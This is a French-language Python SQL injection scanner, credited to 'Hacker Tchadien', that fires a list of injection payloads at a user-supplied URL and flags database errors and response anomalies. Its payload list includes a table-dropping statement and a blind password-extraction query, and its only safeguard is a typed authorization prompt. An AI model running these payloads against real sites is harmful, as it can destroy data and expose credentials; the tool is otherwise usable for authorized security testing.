#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
  SQLi SCANNER SECURITE - Développé par les Hacker Tchadien
============================================================

OUTIL DE TEST DE SECURITE LEGAL ET ETHIQUE

Ce script permet de scanner vos propres sites web ou ceux
pour lesquels vous avez une autorisation ecrite explicite
afin de detecter les vulnerabilites SQL Injection.

AVERTISSEMENT :
L'utilisation de ce script sur des sites sans autorisation
est ILLEGALE et punissable par la loi.

Auteur : Hacker Tchadien
Version : 1.0
"""

import requests
import sys
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs

# ============================================================
#  BANNIERE
# ============================================================

def banner():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║     SQLi SCANNER SECURITE                                ║
    ║     Développé par les Hacker Tchadien                    ║
    ║                                                          ║
    ║     OUTIL DE TEST DE SECURITE LEGAL                      ║
    ║     Utilisez uniquement sur vos propres sites            ║
    ║     ou avec autorisation ecrite explicite                ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)

# ============================================================
#  PAYLOADS DE TEST SQL INJECTION (DETECTION UNIQUEMENT)
# ============================================================

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "') OR ('1'='1",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'; DROP TABLE users; --",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 OR 1=1",
    "1' OR '1'='1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "' OR 1=1 LIMIT 1 --",
    "1 AND ascii(lower(substring((SELECT pwd FROM users LIMIT 1,1),1,1)))=74",
]

# ============================================================
#  INDICATEURS DE VULNERABILITE
# ============================================================

ERROR_INDICATORS = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "pg_query",
    "pg_exec",
    "sqlite_query",
    "sqlite3",
    "ORA-",
    "Oracle error",
    "Microsoft OLE DB Provider",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "unexpected token",
    "near \"\"",
    "warning: mysql",
    "warning: pg",
    "error in your SQL syntax",
    "mysql error",
    "sql error",
    "database error",
    "db error",
    "sqlstate",
    "pdoexception",
    "mysqli",
    "pg_result",
    "sqlite_error",
    "unrecognized token",
    "you have an error in your sql syntax",
    "supplied argument is not a valid mysql",
    "call to a member function",
    "server error in '/' application",
    "incorrect syntax near",
    "the used select statements have a different number of columns",
    "union select",
    "subquery returns more than 1 row",
    "division by zero",
    "illegal mix of collations",
    "table doesn't exist",
    "unknown column",
    "where clause",
    "unknown table",
    "column count doesn't match",
    "operand should contain",
    "invalid column name",
    "ambiguous column name",
]

# ============================================================
#  FONCTIONS PRINCIPALES
# ============================================================

def get_user_confirmation():
    """Demande confirmation legale a l'utilisateur"""
    print("\n[!] AVERTISSEMENT LEGAL :")
    print("-" * 60)
    print("Ce scanner doit etre utilise UNIQUEMENT sur :")
    print("  1. Vos propres sites web et applications")
    print("  2. Des sites pour lesquels vous avez une AUTORISATION ECRITE")
    print("  3. Des environnements de test dedies (DVWA, WebGoat, etc.)")
    print("\nL'utilisation non autorisee est ILLEGALE.")
    print("-" * 60)
    
    confirmation = input("\nConfirmez-vous avoir le droit de tester cette cible ? (oui/non) : ").strip().lower()
    if confirmation not in ['oui', 'yes', 'o', 'y']:
        print("\n[!] Scan annule. Autorisation non confirmee.")
        sys.exit(0)
    
    print("\n[+] Confirmation enregistree. Demarrage du scan...")
    time.sleep(1)


def send_request(url, payload, param_name, method="GET", timeout=10):
    """Envoie une requete avec le payload de test"""
    try:
        headers = {
            'User-Agent': 'SQLi-Security-Scanner/1.0 (Security Testing Tool)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        if method.upper() == "GET":
            # Injecter le payload dans le parametre
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            if param_name in query_params:
                query_params[param_name] = [payload]
            else:
                query_params[param_name] = [payload]
            
            # Reconstruire l'URL
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            response = requests.get(test_url, headers=headers, timeout=timeout, allow_redirects=False)
        else:
            data = {param_name: payload}
            response = requests.post(url, data=data, headers=headers, timeout=timeout, allow_redirects=False)
        
        return response
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception as e:
        return None


def check_sql_error(response_text):
    """Verifie si la reponse contient des erreurs SQL"""
    response_lower = response_text.lower()
    detected_errors = []
    
    for indicator in ERROR_INDICATORS:
        if indicator.lower() in response_lower:
            detected_errors.append(indicator)
    
    return detected_errors


def test_parameter(url, param_name, method="GET"):
    """Teste un parametre specifique avec differents payloads"""
    vulnerabilities = []
    
    print(f"\n    [>] Test du parametre : {param_name} (methode {method})")
    
    # Envoyer une requete normale pour comparaison
    normal_response = send_request(url, "test123", param_name, method)
    if normal_response is None:
        print(f"    [!] Impossible de contacter le serveur")
        return vulnerabilities
    
    normal_length = len(normal_response.text)
    normal_status = normal_response.status_code
    
    for i, payload in enumerate(SQLI_PAYLOADS):
        response = send_request(url, payload, param_name, method)
        
        if response is None:
            continue
        
        # Verifier les erreurs SQL
        errors = check_sql_error(response.text)
        
        if errors:
            vulnerabilities.append({
                'param': param_name,
                'payload': payload,
                'type': 'SQL Error',
                'details': errors,
                'status_code': response.status_code
            })
            print(f"    [!!!] VULNERABILITE DETECTEE !")
            print(f"          Payload : {payload}")
            print(f"          Erreurs : {', '.join(errors[:3])}")
        
        # Verifier les differences de taille de reponse (indicateur de blind SQLi)
        response_length = len(response.text)
        length_diff = abs(response_length - normal_length)
        
        if length_diff > 500 and not errors:
            # Grande difference sans erreur apparente = possible blind SQLi
            vulnerabilities.append({
                'param': param_name,
                'payload': payload,
                'type': 'Anomalie de reponse (possible Blind SQLi)',
                'details': [f"Difference de taille: {length_diff} octets"],
                'status_code': response.status_code
            })
            print(f"    [!!] Anomalie detectee (possible Blind SQLi)")
            print(f"          Payload : {payload}")
            print(f"          Difference de taille : {length_diff} octets")
        
        # Verifier les differences de status code
        if response.status_code != normal_status and response.status_code in [500, 502, 503]:
            vulnerabilities.append({
                'param': param_name,
                'payload': payload,
                'type': 'Erreur serveur (500)',
                'details': [f"Status code: {response.status_code}"],
                'status_code': response.status_code
            })
            print(f"    [!!] Erreur serveur detectee")
            print(f"          Payload : {payload}")
            print(f"          Status : {response.status_code}")
        
        # Petit delai pour ne pas surcharger le serveur
        time.sleep(0.3)
    
    return vulnerabilities


def extract_parameters(url):
    """Extrait les parametres d'une URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys())


def scan_url(url):
    """Scanne une URL pour detecter les vulnerabilites SQL Injection"""
    print(f"\n[*] Cible : {url}")
    print("-" * 60)
    
    all_vulnerabilities = []
    
    # Extraire les parametres GET
    get_params = extract_parameters(url)
    
    if not get_params:
        print("[!] Aucun parametre GET detecte dans l'URL.")
        print("[*] Test avec un parametre par defaut 'id'...")
        get_params = ['id']
    
    # Tester chaque parametre GET
    for param in get_params:
        vulns = test_parameter(url, param, "GET")
        all_vulnerabilities.extend(vulns)
    
    # Tester aussi en POST avec les memes parametres
    print(f"\n[*] Test en methode POST...")
    for param in get_params:
        vulns = test_parameter(url, param, "POST")
        all_vulnerabilities.extend(vulns)
    
    return all_vulnerabilities


def generate_report(url, vulnerabilities):
    """Genere un rapport de securite"""
    print("\n" + "=" * 60)
    print("           RAPPORT DE SECURITE SQL INJECTION")
    print("=" * 60)
    print(f"\nCible scannee : {url}")
    print(f"Date du scan : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\nNombre de vulnerabilites detectees : {len(vulnerabilities)}")
    
    if not vulnerabilities:
        print("\n[+] AUCUNE VULNERABILITE SQL INJECTION DETECTEE")
        print("    (Cela ne garantit pas que le site est 100% securise)")
    else:
        print("\n[!] VULNERABILITES DETECTEES :")
        print("-" * 60)
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n  Vulnerabilite #{i}")
            print(f"  - Parametre : {vuln['param']}")
            print(f"  - Type : {vuln['type']}")
            print(f"  - Payload : {vuln['payload']}")
            print(f"  - Details : {', '.join(vuln['details'])}")
            print(f"  - Status HTTP : {vuln['status_code']}")
    
    print("\n" + "=" * 60)
    print("RECOMMANDATIONS DE SECURITE :")
    print("=" * 60)
    print("""
  1. Utilisez des requetes preparees (Prepared Statements)
  2. Validez et assainissez toutes les entrees utilisateur
  3. Utilisez des ORM (Object-Relational Mapping)
  4. Appliquez le principe du moindre privilege pour la BDD
  5. Desactivez l'affichage des erreurs SQL en production
  6. Utilisez un WAF (Web Application Firewall)
  7. Effectuez des audits de securite reguliers
    """)
    
    # Sauvegarder le rapport
    filename = f"rapport_securite_{int(time.time())}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("     RAPPORT DE SECURITE SQL INJECTION\n")
        f.write("     Genere par SQLi Scanner Securite\n")
        f.write("     Developpe par les Hacker Tchadien\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Cible: {url}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Vulnerabilites detectees: {len(vulnerabilities)}\n\n")
        
        if vulnerabilities:
            f.write("VULNERABILITES DETECTEES :\n")
            f.write("-" * 60 + "\n")
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f"\nVulnerabilite #{i}\n")
                f.write(f"  Parametre: {vuln['param']}\n")
                f.write(f"  Type: {vuln['type']}\n")
                f.write(f"  Payload: {vuln['payload']}\n")
                f.write(f"  Details: {', '.join(vuln['details'])}\n")
                f.write(f"  Status HTTP: {vuln['status_code']}\n")
        else:
            f.write("Aucune vulnerabilite detectee.\n")
        
        f.write("\n" + "=" * 60 + "\n")
        f.write("AVERTISSEMENT LEGAL :\n")
        f.write("=" * 60 + "\n")
        f.write("Ce rapport a ete genere dans un cadre legal et ethique.\n")
        f.write("L'utilisation de ces informations a des fins malveillantes\n")
        f.write("est strictement interdite et punissable par la loi.\n")
    
    print(f"\n[+] Rapport sauvegarde dans : {filename}")


def main():
    """Fonction principale"""
    banner()
    
    # Confirmation legale
    get_user_confirmation()
    
    # Demander l'URL
    url = input("\nEntrez l'URL du site a scanner : ").strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Valider l'URL
    try:
        result = urlparse(url)
        if not all([result.scheme, result.netloc]):
            print("[!] URL invalide.")
            sys.exit(1)
    except Exception:
        print("[!] URL invalide.")
        sys.exit(1)
    
    print(f"\n[*] Demarrage du scan de securite...")
    print(f"[*] Cible : {url}")
    
    # Lancer le scan
    vulnerabilities = scan_url(url)
    
    # Generer le rapport
    generate_report(url, vulnerabilities)
    
    print("\n[*] Scan termine.")
    print("[*] Utilisez ce rapport pour corriger les vulnerabilites detectees.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrompu par l'utilisateur.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erreur : {e}")
        sys.exit(1)
